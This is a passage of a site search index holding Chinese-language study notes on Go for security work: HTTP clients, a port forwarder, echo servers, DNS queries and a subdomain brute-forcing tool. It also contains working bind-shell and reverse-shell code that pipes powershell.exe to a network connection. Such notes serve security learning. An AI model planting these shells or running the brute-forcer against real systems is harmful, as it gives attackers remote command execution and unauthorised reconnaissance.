\u901a\u8fc7NewRequest\u81ea\u5b9a\u4e49\u8bf7\u6c42\u5934,\u793a\u4f8b\u5982\u4e0b: package main import ( \"encoding/json\" \"fmt\" \"log\" \"net/http\" ) type Result struct { Slideshow map [ string ] interface {} `json:\"slideshow\"` } func main () { req , err := http . NewRequest ( \"GET\" , \"https://httpbin.org/json\" , nil ) var client http . Client = http . Client {} req . Header . Add ( \"Accept\" , \"application/json\" ) resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () var result Result if err := json . NewDecoder ( resp . Body ). Decode ( & result ); err != nil { log . Fatalln ( \"error:\" , err ) } fmt . Printf ( \"%#v\\n\" , result ) } \u901a\u8fc7NewReuqest\u53d1\u9001\u5176\u4ed6\u8bf7\u6c42\u65b9\u6cd5, \u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" ) func main () { req , err := http . NewRequest ( \"DELETE\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () } Client\u53ef\u4ee5\u63a7\u5236\u91cd\u5b9a\u5411, \u8d85\u65f6\u65f6\u95f4\u7b49,\u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" \"time\" ) func main () { req , err := http . NewRequest ( \"GET\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client = http . Client { CheckRedirect : func ( req * http . Request , via [] * http . Request ) error { // \u7981\u6b62\u91cd\u5b9a\u5411 return http . ErrUseLastResponse }, Timeout : time . Duration ( 90 * time . Second ), // 90\u79d2\u8d85\u65f6\u65f6\u95f4 } resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () }","title":"\u7b2c\u4e09\u7ae0-HTTP"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u7b2c\u4e09\u7ae0-http","text":"","title":"\u7b2c\u4e09\u7ae0-HTTP"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u4e86\u89e3nethttp\u5305","text":"\u6709\u4ee5\u4e0b\u51e0\u4e2a\u5e38\u7528\u7684\u51fd\u6570 Get(url string) (resp *Response, err error) Head(url string) (resp *Response, err error) Post(url string, bodyType string, body io.Reader) (resp *Response, err error) PostForm(url string, data url.Values) (resp *Response, err error) \u7b80\u5355\u5730\u53d1\u9001GET/POST\u8bf7\u6c42 package main import ( \"fmt\" \"io/ioutil\" \"log\" \"net/http\" \"net/url\" \"strings\" ) func main () { r1 , err := http . Get ( \"http://httpbin.org/get?a=1\" ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r1 . Body . Close () body , err := ioutil . ReadAll ( r1 . Body ) if err != nil { log . Fatalln ( \"Error: \" , err ) } fmt . Println ( string ( body )) form := url . Values {} form . Add ( \"foo\" , \"bar\" ) r2 , err := http . Post ( \"http://httpbin.org/post\" , \"application/x-www-form-urlencoded\" , strings . NewReader ( form . Encode ()), ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r2 . Body . Close () r3 , err := http . PostForm ( \"http://httpbin.org/post\" , form , ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r3 . Body . Close () }","title":"\u4e86\u89e3net/http\u5305"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u901a\u8fc7newreuqestclient\u62d3\u5c55\u8bf7\u6c42","text":"NewRequest\u5b9a\u4e49\u4e3a: NewRequest(umethod, vurl string, wbody io.Reader) (req *Request, err error) \u901a\u8fc7NewRequest\u81ea\u5b9a\u4e49\u8bf7\u6c42\u5934,\u793a\u4f8b\u5982\u4e0b: package main import ( \"encoding/json\" \"fmt\" \"log\" \"net/http\" ) type Result struct { Slideshow map [ string ] interface {} `json:\"slideshow\"` } func main () { req , err := http . NewRequest ( \"GET\" , \"https://httpbin.org/json\" , nil ) var client http . Client = http . Client {} req . Header . Add ( \"Accept\" , \"application/json\" ) resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () var result Result if err := json . NewDecoder ( resp . Body ). Decode ( & result ); err != nil { log . Fatalln ( \"error:\" , err ) } fmt . Printf ( \"%#v\\n\" , result ) } \u901a\u8fc7NewReuqest\u53d1\u9001\u5176\u4ed6\u8bf7\u6c42\u65b9\u6cd5, \u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" ) func main () { req , err := http . NewRequest ( \"DELETE\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () } Client\u53ef\u4ee5\u63a7\u5236\u91cd\u5b9a\u5411, \u8d85\u65f6\u65f6\u95f4\u7b49,\u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" \"time\" ) func main () { req , err := http . NewRequest ( \"GET\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client = http . Client { CheckRedirect : func ( req * http . Request , via [] * http . Request ) error { // \u7981\u6b62\u91cd\u5b9a\u5411 return http . ErrUseLastResponse }, Timeout : time . Duration ( 90 * time . Second ), // 90\u79d2\u8d85\u65f6\u65f6\u95f4 } resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () }","title":"\u901a\u8fc7NewReuqest/Client\u62d3\u5c55\u8bf7\u6c42"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/","text":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5 # \u5efa\u7acbTCP\u8fde\u63a5\u4e0e\u4ee3\u7406 # \u7b80\u5355\u5730\u8fde\u63a5\u5230\u67d0\u4e2aip\u548c\u7aef\u53e3 package main import ( \"fmt\" \"net\" ) func main () { conn , err := net . Dial ( \"tcp\" , \"scanme.nmap.org:80\" ) defer conn . Close () if err == nil { fmt . Println ( \"Connect success\" ) } } \u7b80\u5355\u5730\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1 package main import ( \"io\" \"log\" \"net\" \"strings\" ) func proxy ( conn net . Conn ) { dst , err := net . Dial ( \"tcp\" , \"localhost:80\" ) defer func () { dst . Close () conn . Close () }() if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go func () { if _ , err := io . Copy ( dst , conn ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"2 Error: %v\\n\" , err ) } }() if _ , err := io . Copy ( conn , dst ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"1 Error: %v\\n\" , err ) } } func main () { listener , err := net . Listen ( \"tcp\" , \":8888\" ) if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } for { conn , err := listener . Accept () if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go proxy ( conn ) } } echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f # \u6700\u5e95\u5c42\u7684\u5b9e\u73b0\u65b9\u5f0f,\u4f7f\u7528 net.Conn.Read \u548c net.Conn.Write \u5e95\u5c42\u51fd\u6570 \u4f7f\u7528golang\u81ea\u5e26\u7684bufio\u5305,\u4f7f\u7528 bufio.NewReader.ReadString \u548c bufio.NewWriter.WriteString \u5b9e\u73b0,\u81ea\u5e26\u7f13\u5b58,\u5728\u5199\u5165\u7684\u65f6\u5019\u53ef\u80fd\u9700\u8981flush\u624d\u80fd\u7acb\u5373\u663e\u793a \u4f7f\u7528golang\u81ea\u5e26\u7684io\u5305,\u4f7f\u7528 io.Copy(dst *io.Writer, src *io.Reader) \u5b9e\u73b0,\u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0Reader\u548cWriter,\u53ea\u9700\u8981\u5b9e\u73b0 Read(b []byte) (int, error) \u6216 Write(b []byte) (int, error) \u5373\u53ef \u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u4e2d\u4f7f\u7528net.Dial\u8fde\u63a5\u5230\u9700\u8981\u4ee3\u7406\u7684\u76ee\u6807,\u5e76\u4f7f\u7528io.Copy\u5c06\u8bf7\u6c42\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u81f3\u76ee\u6807(\u8d77\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b),\u5c06\u76ee\u6807\u7684\u54cd\u5e94\u53d1\u9001\u81f3\u8bf7\u6c42\u6e90 Golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u5927\u81f4\u6d41\u7a0b import ( \"io\" \"log\" \"net\" \"os/exec\" ) func handle ( conn net . Conn ) { cmd := exec . Command ( \"powershell.exe\" ) rp , wp := io . Pipe () cmd . Stdin = conn // read input from conn cmd . Stdout = wp cmd . Stderr = wp go io . Copy ( conn , rp ) // read output to conn cmd . Run () conn . Close () } func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { listener , err := net . Listen ( \"tcp\" , \":20080\" ) if err != nil { log . Fatalln ( \"Unable to bind to port\" ) } log . Println ( \"Listening on 0.0.0.0:20080\" ) for { conn , err := listener . Accept () if err != nil { log . Fatalln ( \"Unable to accept connetcion\" ) } go handle ( conn ) } } Golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u548c\u6b63\u5411shell\u4e00\u6837 import import ( \"io\" \"net\" \"os/exec\" ) func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { reConn , _ := net . Dial ( \"tcp\" , \"127.0.0.1:8888\" ) handle2 ( reConn ); }","title":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5","text":"","title":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u5efa\u7acbtcp\u8fde\u63a5\u4e0e\u4ee3\u7406","text":"\u7b80\u5355\u5730\u8fde\u63a5\u5230\u67d0\u4e2aip\u548c\u7aef\u53e3 package main import ( \"fmt\" \"net\" ) func main () { conn , err := net . Dial ( \"tcp\" , \"scanme.nmap.org:80\" ) defer conn . Close () if err == nil { fmt . Println ( \"Connect success\" ) } } \u7b80\u5355\u5730\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1 package main import ( \"io\" \"log\" \"net\" \"strings\" ) func proxy ( conn net . Conn ) { dst , err := net . Dial ( \"tcp\" , \"localhost:80\" ) defer func () { dst . Close () conn . Close () }() if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go func () { if _ , err := io . Copy ( dst , conn ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"2 Error: %v\\n\" , err ) } }() if _ , err := io . Copy ( conn , dst ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"1 Error: %v\\n\" , err ) } } func main () { listener , err := net . Listen ( \"tcp\" , \":8888\" ) if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } for { conn , err := listener . Accept () if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go proxy ( conn ) } }","title":"\u5efa\u7acbTCP\u8fde\u63a5\u4e0e\u4ee3\u7406"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f","text":"\u6700\u5e95\u5c42\u7684\u5b9e\u73b0\u65b9\u5f0f,\u4f7f\u7528 net.Conn.Read \u548c net.Conn.Write \u5e95\u5c42\u51fd\u6570 \u4f7f\u7528golang\u81ea\u5e26\u7684bufio\u5305,\u4f7f\u7528 bufio.NewReader.ReadString \u548c bufio.NewWriter.WriteString \u5b9e\u73b0,\u81ea\u5e26\u7f13\u5b58,\u5728\u5199\u5165\u7684\u65f6\u5019\u53ef\u80fd\u9700\u8981flush\u624d\u80fd\u7acb\u5373\u663e\u793a \u4f7f\u7528golang\u81ea\u5e26\u7684io\u5305,\u4f7f\u7528 io.Copy(dst *io.Writer, src *io.Reader) \u5b9e\u73b0,\u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0Reader\u548cWriter,\u53ea\u9700\u8981\u5b9e\u73b0 Read(b []byte) (int, error) \u6216 Write(b []byte) (int, error) \u5373\u53ef","title":"echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u4e2d\u4f7f\u7528net.Dial\u8fde\u63a5\u5230\u9700\u8981\u4ee3\u7406\u7684\u76ee\u6807,\u5e76\u4f7f\u7528io.Copy\u5c06\u8bf7\u6c42\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u81f3\u76ee\u6807(\u8d77\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b),\u5c06\u76ee\u6807\u7684\u54cd\u5e94\u53d1\u9001\u81f3\u8bf7\u6c42\u6e90","title":"\u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u5927\u81f4\u6d41\u7a0b import ( \"io\" \"log\" \"net\" \"os/exec\" ) func handle ( conn net . Conn ) { cmd := exec . Command ( \"powershell.exe\" ) rp , wp := io . Pipe () cmd . Stdin = conn // read input from conn cmd . Stdout = wp cmd . Stderr = wp go io . Copy ( conn , rp ) // read output to conn cmd . Run () conn . Close () } func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { listener , err := net . Listen ( \"tcp\" , \":20080\" ) if err != nil { log . Fatalln ( \"Unable to bind to port\" ) } log . Println ( \"Listening on 0.0.0.0:20080\" ) for { conn , err := listener . Accept () if err != nil { log . Fatalln ( \"Unable to accept connetcion\" ) } go handle ( conn ) } }","title":"Golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u548c\u6b63\u5411shell\u4e00\u6837 import import ( \"io\" \"net\" \"os/exec\" ) func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { reConn , _ := net . Dial ( \"tcp\" , \"127.0.0.1:8888\" ) handle2 ( reConn ); }","title":"Golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/","text":"\u7b2c\u4e94\u7ae0-DNS # \u4e3b\u8981\u5b66\u4e60 dns \u8fd9\u4e2a\u7b2c\u4e09\u5305\u7684\u4f7f\u7528 FQDN # \u4e00\u4e2a\u7b80\u5355\u7684dns\u7684 fully qualified domain name (fqdn)\u8bf7\u6c42,\u4f7f\u7528A\u8bb0\u5f55,\u5e76\u8f93\u51fa\u7ed3\u679c package main import ( \"fmt\" \"github.com/miekg/dns\" ) func main () { var msg dns . Msg fqdn := dns . Fqdn ( \"stacktitan.com\" ) msg . SetQuestion ( fqdn , dns . TypeA ) in , err := dns . Exchange ( & msg , \"8.8.8.8:53\" ) if err != nil { panic ( err ) } if len ( in . Answer ) < 1 { fmt . Println ( \"No records\" ) return } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { fmt . Println ( a . A ) } } } \u7b80\u5355\u5730\u5206\u6790\u4e00\u4e0b, in \u8fd9\u4e2a\u53d8\u91cf\u7c7b\u578b\u662fdns.Msg,\u800cMsg\u7684\u7ed3\u6784\u5982\u4e0b type Msg struct { MsgHdr Compress bool `json:\"-\"` // If true, the message will be compressed... u Question [] Question // Holds the RR(s) of the question section. v Answer [] RR // Holds the RR(s) of the answer section. Ns [] RR // Holds the RR(s) of the authority section. Extra [] RR // Holds the RR(s) of the additional section. } \u800cRR\u5219\u662f\u4e00\u4e2a\u63a5\u53e3,\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u6cd5 type RR interface { // Header returns the header of an resource record. The header contains // everything up to the rdata. Header () * RR_Header // String returns the text representation of the resource record. String () string // copy returns a copy of the RR copy () RR // len returns the length (in octets) of the compressed or uncompressed RR in wire format. // // If compression is nil, the uncompressed size will be returned, otherwise the compressed // size will be returned and domain names will be added to the map for future compression. len ( off int , compression map [ string ] struct {}) int // pack packs the records RDATA into wire format. The header will // already have been packed into msg. pack ( msg [] byte , off int , compression compressionMap , compress bool ) ( off1 int , err error ) // unpack unpacks an RR from wire format. // // This will only be called on a new and empty RR type with only the header populated. It // will only be called if the record's RDATA is non-empty. unpack ( msg [] byte , off int ) ( off1 int , err error ) // parse parses an RR from zone file format. // // This will only be called on a new and empty RR type with only the header populated. parse ( c * zlexer , origin string ) * ParseError // isDuplicate returns whether the two RRs are duplicates. isDuplicate ( r2 RR ) bool } \u6700\u540e\u904d\u5386answer(\u53d8\u91cf\u7c7b\u578b\u662fRR),\u8fd9\u91cc\u6709\u4e00\u4e2a\u5f3a\u5236\u8f6c\u6362 a, ok := answer.(*dns.A); ok ,\u5c06RR\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u4e3a*dns.A,\u800cdns.A\u7684\u76f8\u5173\u7ed3\u6784\u53c8\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230dns.A\u7ec4\u5408\u4e86RR Header\u8fd9\u4e2a\u7c7b\u578b,\u800cRR Header\u5b9e\u73b0\u4e86RR\u7684\u65b9\u6cd5,\u56e0\u6b64dns.A\u53ef\u4ee5\u662fRR\u7c7b\u578b // A RR. See RFC 1035. type A struct { Hdr RR_Header A net . IP `dns:\"a\"` } // RR_Header is the header all DNS resource records share. type RR_Header struct { Name string `dns:\"cdomain-name\"` Rrtype uint16 Class uint16 Ttl uint32 Rdlength uint16 // Length of data after header. } // Header returns itself. This is here to make RR_Header implements the RR interface. func ( h * RR_Header ) Header () * RR_Header { return h } // Just to implement the RR interface. func ( h * RR_Header ) copy () RR { return nil } // ... subdomain_fuzzer # \u53c2\u8003blackhat-go\u91ccsubdomain_guesser\u5199\u7684,\u4e00\u4e2a\u7b80\u5355\u7684\u6839\u636e\u5b57\u5178\u901a\u8fc7dns\u67e5\u8be2\u7206\u7834\u5b50\u57df\u540d\u7684\u5de5\u5177,\u6838\u5fc3\u57fa\u672c\u4e00\u6837,\u4f46\u662f\u7531\u4e8e\u539f\u4f5c\u8005\u5199\u7684\u534f\u7a0b\u5e76\u53d1\u4ee3\u7801\u6709\u70b9\u96be\u4ee5\u7406\u89e3,\u6240\u4ee5\u7a0d\u5fae\u4fee\u6539\u4e86\u4e00\u4e0b,\u4f7f\u7528\u4e86 sizedwaitgroup \u8fd9\u4e2a\u5305 package main import ( \"bufio\" \"errors\" \"flag\" \"fmt\" \"os\" \"github.com/miekg/dns\" \"github.com/remeh/sizedwaitgroup\" ) // type Result struct { IpAddress string Hostname string } // func LookupA ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var ips [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeA ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return ips , err } if len ( in . Answer ) < 1 { return ips , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { ips = append ( ips , a . A . String ()) } } return ips , nil } func LookupCNAME ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var fqdns [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeCNAME ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return fqdns , err } if len ( in . Answer ) < 1 { return fqdns , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if c , ok := answer .( * dns . CNAME ); ok { fqdns = append ( fqdns , c . Target ) } } return fqdns , nil } // func Lookup ( fqdn , serverAddr string ) [] Result { var results [] Result var cfqdn = fqdn for { cnames , err := LookupCNAME ( cfqdn , serverAddr ) if err == nil && len ( cnames ) > 0 { cfqdn = cnames [ 0 ] continue } ips , err := LookupA ( cfqdn , serverAddr ) if err != nil { break } for _ , ip := range ips { results = append ( results , Result { IpAddress : ip , Hostname : fqdn , }) } break } return results } func worker ( fqdn string , serverAddr string , resultChannel chan [] Result , swg * sizedwaitgroup . SizedWaitGroup ) { results := Lookup ( fqdn , serverAddr ) if len ( results ) > 0 { resultChannel <- results } return } func main () { var ( flDomain = flag . String ( \"domain\" , \"\" , \"The domain to perform fuzzing against.\" ) flWordlist = flag . String ( \"wordlist\" , \"\" , \"The wordlist to use for fuzzing\" ) flWorkerCount = flag . Int ( \"c\" , 100 , \"The amount of worker to use\" ) flServerAddr = flag . String ( \"server\" , \"8.8.8.8:53\" , \"The DNS server to use\" ) ) flag . Parse () if * flDomain == \"\" || * flWordlist == \"\" { fmt . Println ( \"domain and wordlist are rquired\" ) os . Exit ( 1 ) } swg := sizedwaitgroup . New ( * flWorkerCount ) resultsChannel := make ( chan [] Result ) var results [] Result go func () { // ? read from channel immediately for r := range resultsChannel { for _ , result := range r { fmt . Printf ( \"%s\\t%s\\n\" , result . Hostname , result . IpAddress ) } results = append ( results , r ... ) swg . Done () } }() fh , err := os . Open ( * flWordlist ) if err != nil { fmt . Println ( \"Cannot read \" + * flWordlist ) os . Exit ( 2 ) } defer fh . Close () reader := bufio . NewReader ( fh ) for { bytes , _ , err := reader . ReadLine () line := string ( bytes [:]) if err != nil { break } swg . Add () go worker ( fmt . Sprintf ( \"%s.%s\" , line , * flDomain ), * flServerAddr , resultsChannel , & swg ) } swg . Wait () close ( resultsChannel ) fmt . Println ( \"\\nResult:\\n-----------------------------------------------\" ) for _ , r := range results { fmt . Printf ( \"%s\\t%s\\n\" , r . Hostname , r . IpAddress ) } }","title":"\u7b2c\u4e94\u7ae0-DNS"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#\u7b2c\u4e94\u7ae0-dns","text":"\u4e3b\u8981\u5b66\u4e60 dns \u8fd9\u4e2a\u7b2c\u4e09\u5305\u7684\u4f7f\u7528","title":"\u7b2c\u4e94\u7ae0-DNS"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#fqdn","text":"\u4e00\u4e2a\u7b80\u5355\u7684dns\u7684 fully qualified domain name (fqdn)\u8bf7\u6c42,\u4f7f\u7528A\u8bb0\u5f55,\u5e76\u8f93\u51fa\u7ed3\u679c package main import ( \"fmt\" \"github.com/miekg/dns\" ) func main () { var msg dns . Msg fqdn := dns . Fqdn ( \"stacktitan.com\" ) msg . SetQuestion ( fqdn , dns . TypeA ) in , err := dns . Exchange ( & msg , \"8.8.8.8:53\" ) if err != nil { panic ( err ) } if len ( in . Answer ) < 1 { fmt . Println ( \"No records\" ) return } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { fmt . Println ( a . A ) } } } \u7b80\u5355\u5730\u5206\u6790\u4e00\u4e0b, in \u8fd9\u4e2a\u53d8\u91cf\u7c7b\u578b\u662fdns.Msg,\u800cMsg\u7684\u7ed3\u6784\u5982\u4e0b type Msg struct { MsgHdr Compress bool `json:\"-\"` // If true, the message will be compressed... u Question [] Question // Holds the RR(s) of the question section. v Answer [] RR // Holds the RR(s) of the answer section. Ns [] RR // Holds the RR(s) of the authority section. Extra [] RR // Holds the RR(s) of the additional section. } \u800cRR\u5219\u662f\u4e00\u4e2a\u63a5\u53e3,\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u6cd5 type RR interface { // Header returns the header of an resource record. The header contains // everything up to the rdata. Header () * RR_Header // String returns the text representation of the resource record. String () string // copy returns a copy of the RR copy () RR // len returns the length (in octets) of the compressed or uncompressed RR in wire format. // // If compression is nil, the uncompressed size will be returned, otherwise the compressed // size will be returned and domain names will be added to the map for future compression. len ( off int , compression map [ string ] struct {}) int // pack packs the records RDATA into wire format. The header will // already have been packed into msg. pack ( msg [] byte , off int , compression compressionMap , compress bool ) ( off1 int , err error ) // unpack unpacks an RR from wire format. // // This will only be called on a new and empty RR type with only the header populated. It // will only be called if the record's RDATA is non-empty. unpack ( msg [] byte , off int ) ( off1 int , err error ) // parse parses an RR from zone file format. // // This will only be called on a new and empty RR type with only the header populated. parse ( c * zlexer , origin string ) * ParseError // isDuplicate returns whether the two RRs are duplicates. isDuplicate ( r2 RR ) bool } \u6700\u540e\u904d\u5386answer(\u53d8\u91cf\u7c7b\u578b\u662fRR),\u8fd9\u91cc\u6709\u4e00\u4e2a\u5f3a\u5236\u8f6c\u6362 a, ok := answer.(*dns.A); ok ,\u5c06RR\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u4e3a*dns.A,\u800cdns.A\u7684\u76f8\u5173\u7ed3\u6784\u53c8\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230dns.A\u7ec4\u5408\u4e86RR Header\u8fd9\u4e2a\u7c7b\u578b,\u800cRR Header\u5b9e\u73b0\u4e86RR\u7684\u65b9\u6cd5,\u56e0\u6b64dns.A\u53ef\u4ee5\u662fRR\u7c7b\u578b // A RR. See RFC 1035. type A struct { Hdr RR_Header A net . IP `dns:\"a\"` } // RR_Header is the header all DNS resource records share. type RR_Header struct { Name string `dns:\"cdomain-name\"` Rrtype uint16 Class uint16 Ttl uint32 Rdlength uint16 // Length of data after header. } // Header returns itself. This is here to make RR_Header implements the RR interface. func ( h * RR_Header ) Header () * RR_Header { return h } // Just to implement the RR interface. func ( h * RR_Header ) copy () RR { return nil } // 